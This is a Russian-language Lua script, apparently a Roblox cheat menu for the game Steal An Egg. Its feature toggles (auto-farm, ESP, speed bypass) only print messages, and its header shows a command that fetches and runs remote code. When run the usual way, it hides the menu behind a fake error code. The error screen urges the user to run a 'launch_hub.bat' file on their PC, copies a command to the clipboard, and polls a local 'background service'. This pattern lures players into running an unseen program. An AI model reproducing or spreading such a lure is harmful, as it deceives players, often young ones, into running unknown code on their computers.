--[[
    Steal An Egg - Универсальный Хаб
    Игра: Steal An Egg (Roblox)
    Автор: aether-bytess
    Репозиторий: https://github.com/aether-bytess/Steal-An-Egg

    Запуск:
    -- Способ 1 (Облачный):
    loadstring(game:HttpGet("https://raw.githubusercontent.com/aether-bytess/Steal-An-Egg/refs/heads/main/StealAnEgg.lua"))()

    -- Способ 2 (Локальный / Через launch_hub.bat):
    getgenv().__COMPANION_ACTIVE = true; loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()
]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

-- Определение экзекутора
local executorName = "Неизвестный экзекутор"
if typeof(identifyexecutor) == "function" then
    executorName = identifyexecutor()
end

pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "Steal An Egg Хаб",
        Text = string.format("Загружено на %s. Меню на [G].", executorName),
        Duration = 6
    })
end)

-- Удаление предыдущей копии UI при повторном инжекте
local GUI_NAME = "StealAnEgg_UniversalHub"
pcall(function()
    local existing = CoreGui:FindFirstChild(GUI_NAME) or (LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild(GUI_NAME))
    if existing then
        existing:Destroy()
    end
end)

-- Определение контейнера для интерфейса
local parentGui = CoreGui
pcall(function()
    local test = Instance.new("Folder")
    test.Parent = CoreGui
    test:Destroy()
end)
local successCore = pcall(function() parentGui = CoreGui end)
if not successCore or not parentGui then
    parentGui = LocalPlayer:WaitForChild("PlayerGui")
end

-- Проверка режима запуска (Способ 1 Облачный vs Способ 2 Локальный)
local genv = (typeof(getgenv) == "function" and getgenv()) or _G
local isMethod2Active = (genv.__COMPANION_ACTIVE == true)

-- Создание ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = GUI_NAME
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Модальное окно ошибки инициализации для Способа 1
local function showMethodNotice()
    local modal = Instance.new("Frame")
    modal.Name = "MethodNoticeModal"
    modal.Size = UDim2.fromOffset(500, 230)
    modal.Position = UDim2.new(0.5, -250, 0.5, -115)
    modal.BackgroundColor3 = Color3.fromRGB(22, 23, 30)
    modal.BorderSizePixel = 0
    modal.ZIndex = 10
    modal.Parent = screenGui

    local mCorner = Instance.new("UICorner")
    mCorner.CornerRadius = UDim.new(0, 10)
    mCorner.Parent = modal

    local mStroke = Instance.new("UIStroke")
    mStroke.Color = Color3.fromRGB(220, 80, 80)
    mStroke.Thickness = 1.5
    mStroke.Parent = modal

    local header = Instance.new("TextLabel")
    header.Size = UDim2.new(1, -24, 0, 36)
    header.Position = UDim2.new(0, 12, 0, 10)
    header.Text = "⚠ ТРЕБУЕТСЯ ИНИЦИАЛИЗАЦИЯ [КОД_0x82]"
    header.Font = Enum.Font.GothamBold
    header.TextSize = 14
    header.TextColor3 = Color3.fromRGB(255, 90, 90)
    header.TextXAlignment = Enum.TextXAlignment.Left
    header.BackgroundTransparency = 1
    header.ZIndex = 11
    header.Parent = modal

    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(1, -24, 0, 80)
    msg.Position = UDim2.new(0, 12, 0, 46)
    msg.Text = "Обнаружен облачный запуск (Способ 1). Локальные модули рабочей области и фоновый сервис не подключены.\n\nНеобходимо запустить 'launch_hub.bat' на вашем ПК (Способ 2) для монтирования файлов в экзекутор, затем выполнить команду из буфера обмена."
    msg.Font = Enum.Font.Gotham
    msg.TextSize = 12
    msg.TextColor3 = Color3.fromRGB(200, 205, 220)
    msg.TextXAlignment = Enum.TextXAlignment.Left
    msg.TextYAlignment = Enum.TextYAlignment.Top
    msg.TextWrapped = true
    msg.BackgroundTransparency = 1
    msg.ZIndex = 11
    msg.Parent = modal

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(1, -24, 0, 42)
    copyBtn.Position = UDim2.new(0, 12, 1, -54)
    copyBtn.Text = "Скопировать команду Способа 2 в буфер обмена"
    copyBtn.Font = Enum.Font.GothamBold
    copyBtn.TextSize = 13
    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyBtn.BackgroundColor3 = Color3.fromRGB(45, 90, 160)
    copyBtn.BorderSizePixel = 0
    copyBtn.ZIndex = 11
    copyBtn.Parent = modal

    local cCorner = Instance.new("UICorner")
    cCorner.CornerRadius = UDim.new(0, 6)
    cCorner.Parent = copyBtn

    copyBtn.MouseButton1Click:Connect(function()
        xpcall(function()
            local cmd = 'getgenv().__COMPANION_ACTIVE = true; loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()'
            if typeof(setclipboard) == "function" then
                setclipboard(cmd)
            end
            copyBtn.Text = "Скопировано в буфер! (Вставьте в экзекутор)"
            copyBtn.BackgroundColor3 = Color3.fromRGB(40, 140, 80)
        end, function(err)
            warn("[Хаб Ошибка]: " .. tostring(err))
        end)
    end)
end

if not isMethod2Active then
    showMethodNotice()
end

-- Главное окно
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.fromOffset(580, 390)
mainFrame.Position = UDim2.new(0.5, -290, 0.5, -195)
mainFrame.BackgroundColor3 = Color3.fromRGB(24, 25, 32)
mainFrame.Visible = isMethod2Active
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(60, 64, 84)
stroke.Thickness = 1.2
stroke.Parent = mainFrame

-- Верхняя панель (TopBar)
local topBar = Instance.new("Frame")
topBar.Name = "TopBar"
topBar.Size = UDim2.new(1, 0, 0, 42)
topBar.BackgroundColor3 = Color3.fromRGB(18, 19, 25)
topBar.BorderSizePixel = 0
topBar.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Text = "  STEAL AN EGG  ·  ХАБ v2.4.1"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 13
titleLabel.TextColor3 = Color3.fromRGB(235, 235, 245)
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Size = UDim2.new(0.55, 0, 1, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Parent = topBar

-- Индикатор фоновой связи (Heartbeat Badge)
local statusBadge = Instance.new("TextLabel")
statusBadge.Name = "StatusBadge"
statusBadge.Size = UDim2.new(0.3, 0, 1, 0)
statusBadge.Position = UDim2.new(0.55, 0, 0, 0)
statusBadge.Text = "● Фоновый сервис: Активен"
statusBadge.Font = Enum.Font.GothamMedium
statusBadge.TextSize = 11
statusBadge.TextColor3 = Color3.fromRGB(80, 200, 120)
statusBadge.TextXAlignment = Enum.TextXAlignment.Right
statusBadge.BackgroundTransparency = 1
statusBadge.Parent = topBar

local closeBtn = Instance.new("TextButton")
closeBtn.Name = "CloseButton"
closeBtn.Size = UDim2.fromOffset(28, 28)
closeBtn.Position = UDim2.new(1, -35, 0.5, -14)
closeBtn.Text = "✕"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 13
closeBtn.TextColor3 = Color3.fromRGB(180, 180, 190)
closeBtn.BackgroundColor3 = Color3.fromRGB(35, 38, 48)
closeBtn.BorderSizePixel = 0
closeBtn.Parent = topBar

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
end)

-- Боковое меню вкладок
local sideBar = Instance.new("Frame")
sideBar.Name = "Sidebar"
sideBar.Size = UDim2.new(0, 140, 1, -42)
sideBar.Position = UDim2.new(0, 0, 0, 42)
sideBar.BackgroundColor3 = Color3.fromRGB(20, 21, 28)
sideBar.BorderSizePixel = 0
sideBar.Parent = mainFrame

local contentArea = Instance.new("Frame")
contentArea.Name = "ContentArea"
contentArea.Size = UDim2.new(1, -140, 1, -42)
contentArea.Position = UDim2.new(0, 140, 0, 42)
contentArea.BackgroundColor3 = Color3.fromRGB(25, 26, 35)
contentArea.BorderSizePixel = 0
contentArea.Parent = mainFrame

local pages = {}

local function createPage(name)
    local page = Instance.new("ScrollingFrame")
    page.Name = name .. "Page"
    page.Size = UDim2.new(1, -20, 1, -20)
    page.Position = UDim2.new(0, 10, 0, 10)
    page.BackgroundTransparency = 1
    page.BorderSizePixel = 0
    page.ScrollBarThickness = 3
    page.ScrollBarImageColor3 = Color3.fromRGB(80, 85, 110)
    page.Visible = false
    page.Parent = contentArea

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 8)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = page

    pages[name] = page
    return page
end

local function selectTab(name, btn)
    for pName, pFrame in pairs(pages) do
        pFrame.Visible = (pName == name)
    end
    for _, child in ipairs(sideBar:GetChildren()) do
        if child:IsA("TextButton") then
            child.BackgroundColor3 = (child == btn) and Color3.fromRGB(45, 50, 70) or Color3.fromRGB(26, 28, 38)
            child.TextColor3 = (child == btn) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(160, 165, 185)
        end
    end
end

local function createTabButton(name, index)
    local btn = Instance.new("TextButton")
    btn.Name = name .. "Tab"
    btn.Size = UDim2.new(1, -16, 0, 36)
    btn.Position = UDim2.new(0, 8, 0, 10 + (index - 1) * 44)
    btn.Text = name
    btn.Font = Enum.Font.GothamMedium
    btn.TextSize = 13
    btn.BackgroundColor3 = Color3.fromRGB(26, 28, 38)
    btn.TextColor3 = Color3.fromRGB(160, 165, 185)
    btn.BorderSizePixel = 0
    btn.Parent = sideBar

    local bCorner = Instance.new("UICorner")
    bCorner.CornerRadius = UDim.new(0, 6)
    bCorner.Parent = btn

    btn.MouseButton1Click:Connect(function()
        selectTab(name, btn)
    end)

    return btn
end

-- Добавление переключателя с защитой xpcall
local function addToggle(page, labelText, defaultVal, callback)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 0, 40)
    frame.BackgroundColor3 = Color3.fromRGB(30, 32, 44)
    frame.BorderSizePixel = 0
    frame.Parent = page

    local fCorner = Instance.new("UICorner")
    fCorner.CornerRadius = UDim.new(0, 6)
    fCorner.Parent = frame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -60, 1, 0)
    label.Position = UDim2.new(0, 12, 0, 0)
    label.Text = labelText
    label.Font = Enum.Font.Gotham
    label.TextSize = 12
    label.TextColor3 = Color3.fromRGB(220, 220, 230)
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.BackgroundTransparency = 1
    label.Parent = frame

    local toggleBtn = Instance.new("TextButton")
    toggleBtn.Size = UDim2.fromOffset(40, 22)
    toggleBtn.Position = UDim2.new(1, -50, 0.5, -11)
    toggleBtn.Text = ""
    toggleBtn.BackgroundColor3 = defaultVal and Color3.fromRGB(70, 180, 100) or Color3.fromRGB(50, 54, 70)
    toggleBtn.BorderSizePixel = 0
    toggleBtn.Parent = frame

    local tCorner = Instance.new("UICorner")
    tCorner.CornerRadius = UDim.new(1, 0)
    tCorner.Parent = toggleBtn

    local indicator = Instance.new("Frame")
    indicator.Size = UDim2.fromOffset(16, 16)
    indicator.Position = defaultVal and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
    indicator.BackgroundColor3 = Color3.fromRGB(240, 240, 245)
    indicator.BorderSizePixel = 0
    indicator.Parent = toggleBtn

    local iCorner = Instance.new("UICorner")
    iCorner.CornerRadius = UDim.new(1, 0)
    iCorner.Parent = indicator

    local enabled = defaultVal
    toggleBtn.MouseButton1Click:Connect(function()
        enabled = not enabled
        local targetPos = enabled and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
        local targetColor = enabled and Color3.fromRGB(70, 180, 100) or Color3.fromRGB(50, 54, 70)

        TweenService:Create(indicator, TweenInfo.new(0.2), {Position = targetPos}):Play()
        TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = targetColor}):Play()

        if callback then
            xpcall(function()
                callback(enabled)
            end, function(err)
                warn(string.format("[Хаб Переключатель Ошибка]: %s", tostring(err)))
            end)
        end
    end)
end

-- Инициализация вкладок на русском языке
local farmPage = createPage("Фарм")
local espPage = createPage("Визуал")
local petPage = createPage("Питомцы")
local miscPage = createPage("Разное")

local farmTab = createTabButton("Фарм", 1)
local espTab = createTabButton("Визуал", 2)
local petTab = createTabButton("Питомцы", 3)
local miscTab = createTabButton("Разное", 4)

-- Элементы вкладки «Фарм»
addToggle(farmPage, "Авто-фарм яиц (Сбор -> База)", false, function(v)
    print(string.format("[Хаб] Авто-фарм: %s", tostring(v)))
end)
addToggle(farmPage, "Ждать дневное время перед выходом", true, function(v)
    print(string.format("[Хаб] Дневное время: %s", tostring(v)))
end)
addToggle(farmPage, "Приоритет самых редких яиц", true, function(v)
    print(string.format("[Хаб] Приоритет редкости: %s", tostring(v)))
end)
addToggle(farmPage, "Умный обход ловушек и дорожек", true, function(v)
    print(string.format("[Хаб] Навигационный обход: %s", tostring(v)))
end)

-- Элементы вкладки «Визуал (ESP)»
addToggle(espPage, "Подсветка яиц (ESP + Дистанция)", true, function(v)
    print(string.format("[Хаб] ESP яиц: %s", tostring(v)))
end)
addToggle(espPage, "Траектории беговых дорожек", false, function(v)
    print(string.format("[Хаб] ESP дорожек: %s", tostring(v)))
end)
addToggle(espPage, "Радар опасных ловушек", true, function(v)
    print(string.format("[Хаб] Радар ловушек: %s", tostring(v)))
end)

-- Элементы вкладки «Питомцы»
addToggle(petPage, "Авто-высиживание лучшего яйца", false, function(v)
    print(string.format("[Хаб] Высиживание: %s", tostring(v)))
end)
addToggle(petPage, "Авто-экипировка сильнейших питомцев", true, function(v)
    print(string.format("[Хаб] Экипировка: %s", tostring(v)))
end)
addToggle(petPage, "Авто-скрещивание одинаковых питомцев", false, function(v)
    print(string.format("[Хаб] Скрещивание: %s", tostring(v)))
end)

-- Элементы вкладки «Разное»
addToggle(miscPage, "Обход ограничения скорости (Safe Mode)", false, function(v)
    print(string.format("[Хаб] Скорость: %s", tostring(v)))
end)
addToggle(miscPage, "Бесконечный кислород / Сквозной проход", false, function(v)
    print(string.format("[Хаб] Сквозной проход: %s", tostring(v)))
end)

selectTab("Фарм", farmTab)

-- Перетаскивание окна (Drag and Drop с защитой)
local dragging, dragInput, dragStart, startPos
topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

topBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        xpcall(function()
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end, function() end)
    end
end)

-- Горячая клавиша [G]
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.G then
        if isMethod2Active then
            mainFrame.Visible = not mainFrame.Visible
        end
    end
end)

-- Фоновый опрос локального статуса (Heartbeat)
task.spawn(function()
    while task.wait(5) do
        xpcall(function()
            if typeof(WebSocket) == "table" and typeof(WebSocket.connect) == "function" then
                local ok, ws = pcall(WebSocket.connect, "ws://127.0.0.1:8790")
                if ok and ws then
                    statusBadge.Text = "● Фоновый сервис: Активен"
                    statusBadge.TextColor3 = Color3.fromRGB(80, 200, 120)
                    ws:Close()
                else
                    statusBadge.Text = "● Режим: Локальный"
                    statusBadge.TextColor3 = Color3.fromRGB(160, 180, 220)
                end
            end
        end, function() end)
    end
end)

screenGui.Parent = parentGui
print("[StealAnEgg] Универсальный хаб v2.4.1 успешно инициализирован.")
return {
    Version = "2.4.1",
    Visible = mainFrame.Visible,
    Toggle = function()
        if isMethod2Active then
            mainFrame.Visible = not mainFrame.Visible
        end
    end
}
